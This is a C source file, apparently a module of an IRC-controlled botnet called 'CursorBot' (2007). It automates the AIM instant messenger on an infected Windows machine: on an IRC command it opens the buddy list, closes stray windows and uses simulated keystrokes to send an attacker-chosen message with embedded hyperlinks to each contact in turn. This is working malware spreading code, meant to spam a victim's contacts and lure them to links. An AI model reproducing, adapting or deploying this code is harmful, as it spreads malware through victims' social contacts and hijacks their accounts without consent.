/*******************************************************************\
*	PROJECT:	CursorBot											*
*	VERSION:	3.0b												*
*	AUTHOR:		Nocen												*
*	Copyright (C) 2007 - All Rights Reserved						*
\*******************************************************************/
#ifndef NO_AIM
#include "includes.h"
#include "functions.h"

void FocusWindow(HWND hWindow)
{
	SwitchToThisWindow(hWindow, TRUE);
	Sleep(250);
}

void HitKey(unsigned char cKey, unsigned int iTimes)
{
	for(unsigned int i = 0; i < iTimes; ++i)
	{
		keybd_event(cKey, 0, 0, 0);
		keybd_event(cKey, 0, KEYEVENTF_KEYUP, 0);
	}
}

void SysKey(HWND hWindow, WPARAM wKey, unsigned int iTimes)
{
	for(unsigned int i = 0; i < iTimes; ++i)
	{
		SendMessage(hWindow, WM_SYSKEYDOWN, wKey, 0);
		SendMessage(hWindow, WM_SYSKEYUP, wKey, 0);
	}
}

//void TritonMessage(char* szMsg, unsigned int iDelay)
DWORD WINAPI TritonMessage(LPVOID param)
{
	NTHREAD tim = *((NTHREAD *)param);
	NTHREAD *tims = (NTHREAD *)param;
	tims->gotinfo = TRUE;
	IRC* irc=(IRC*)tim.conn;

	char szMsg[512];
	strncpy(szMsg,tim.data1,sizeof(szMsg));
	bool bDone = false;
	char szWindowText[256], szLastBuddy[256];
	ZeroMemory(&szLastBuddy, 256);
	HWND hTray = FindWindow("imAppSystemTrayHandler", "imApp"), hBuddyList = NULL, hKill = NULL;
	if(IsWindow(hTray))
	{
		SendMessage(hTray, 0x0065, 0x00000141, 0x00000203);
		do {
			hBuddyList = FindWindow("__oxFrame.class__", "AIM");
		} while(!IsWindow(hBuddyList));
		do {
			hKill = FindWindowEx(NULL, hKill, "__oxFrame.class__", NULL);
			ZeroMemory(&szWindowText, 256);
			GetWindowText(hKill, szWindowText, 256);
			if(strcmp(szWindowText, "AIM") != 0)
				SendMessage(hKill, WM_CLOSE, 0, 0);
		} while(IsWindow(hKill));
		TritonSetupList(hBuddyList, false);
		while(!bDone)
		{
			Sleep(3000);
			FocusWindow(hBuddyList);
 			SysKey(hBuddyList, VK_DOWN, 1);
 			SysKey(hBuddyList, VK_RETURN, 1);
			HWND hWindow = NULL;
			do {
				hWindow = FindWindowEx(NULL, hWindow, "__oxFrame.class__", NULL);
				if(IsWindow(hWindow))
				{
					ZeroMemory(&szWindowText, 256);
					GetWindowText(hWindow, szWindowText, 256);
					if((strcmp(szWindowText, " IMs") == 0) ||
						(strstr(szWindowText, "IM with ") != NULL))
					{
						if(strcmp(szLastBuddy, szWindowText) == 0)
							bDone = true;
						else {
							strncpy(szLastBuddy, szWindowText, 256);
							FocusWindow(hWindow);
							TritonIm(hWindow, szMsg);
						}
						SendMessage(hWindow, WM_CLOSE, 0, 0);
					}
				}
			} while(IsWindow(hWindow));
		}
 		TritonSetupList(hBuddyList, true);
		//return 0;
	}
	clearthread(tim.threadnum);
	ExitThread(0);

	return 0;
}

void TritonIm(HWND hWindow, char* szMsg)
{
	HWND hLink = NULL;
	for(unsigned int i = 0; i < strlen(szMsg); ++i)
	{
		if (szMsg[i] == '[')
		{
			keybd_event(VK_CONTROL, 0, 0, 0);
			short sKey = VkKeyScan('l');
			keybd_event((unsigned char)sKey, 0, 0, 0);
			keybd_event((unsigned char)sKey, 0, KEYEVENTF_KEYUP, 0);
			keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
			do {
				hLink = FindWindowEx(NULL, hLink, "__oxFrame.class__", "Edit Hyperlink");
			} while(!IsWindow(hLink));
			FocusWindow(hLink);
		} else if (szMsg[i] == '+') {
			HitKey(VK_TAB, 1);
		} else if (szMsg[i] == ']') {
			HitKey(VK_TAB, 1);
			HitKey(VK_RETURN, 1);
			Sleep(250);
			FocusWindow(hWindow);
		} else {
			short sKey = VkKeyScan(szMsg[i]);
			if((sKey >> 8) & 1) keybd_event(VK_LSHIFT, 0, 0, 0);
			keybd_event((unsigned char)sKey, 0, 0, 0);
			keybd_event((unsigned char)sKey, 0, KEYEVENTF_KEYUP, 0);
			if((sKey >> 8) & 1) keybd_event(VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0);
		}
	}
	FocusWindow(hWindow);
	HitKey(VK_RETURN, 1);
	Sleep(250);
}

bool TritonSetupList(HWND hBuddyList, bool bFix)
{  
	FocusWindow(hBuddyList);
	SysKey(hBuddyList, VK_ESCAPE, 2);
	SysKey(hBuddyList, VK_MENU, 1);
	SysKey(hBuddyList, VK_RIGHT, 2);
	SysKey(hBuddyList, VK_UP, 3);
	SysKey(hBuddyList, VK_RIGHT, 1);
	SysKey(hBuddyList, VK_DOWN, (bFix?1:2));
	SysKey(hBuddyList, VK_RETURN, 1);
	SysKey(hBuddyList, VK_MENU, 1);
	SysKey(hBuddyList, VK_RIGHT, 2);
	SysKey(hBuddyList, VK_UP, 7);
	SysKey(hBuddyList, VK_RIGHT, 1);
	if (!bFix)
		SysKey(hBuddyList, VK_DOWN, 1);
	SysKey(hBuddyList, VK_RETURN, 1);
	SysKey(hBuddyList, VK_HOME, 1);
	return true;
}
#endif